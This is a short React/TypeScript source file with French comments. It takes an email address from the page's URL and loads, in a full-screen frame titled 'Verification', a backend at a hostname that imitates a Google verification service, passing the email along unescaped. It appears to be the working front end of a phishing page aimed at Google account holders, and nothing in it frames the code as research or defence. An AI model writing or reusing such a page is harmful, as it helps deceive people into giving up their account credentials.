import React, { useEffect, useState } from 'react';
import { SafeFrame } from './components/SafeFrame';

const App: React.FC = () => {
  const [targetUrl, setTargetUrl] = useState<string>('');

  useEffect(() => {
    // Récupération des paramètres d'URL
    const params = new URLSearchParams(window.location.search);
    
    // Récupère l'email ou utilise la valeur par défaut demandée
    const email = params.get('email') || '******@gmail.com';

    // URL de base du backend PythonAnywhere
    const baseUrl = 'https://archivegoogleverif.pythonanywhere.com/start';
    
    // Construction de l'URL complète
    // On encode l'email pour éviter les erreurs si l'utilisateur met des caractères spéciaux
    const constructedUrl = `${baseUrl}?email=${email}`; // Suppression de encodeURIComponent si vous voulez le format brut, mais c'est recommandé
    
    setTargetUrl(constructedUrl);
  }, []);

  if (!targetUrl) {
    return (
      <div className="flex h-full w-full items-center justify-center bg-gray-100 text-gray-500">
        Chargement...
      </div>
    );
  }

  return (
    <main className="h-full w-full relative">
      <SafeFrame src={targetUrl} title="Verification" />
    </main>
  );
};

export default App;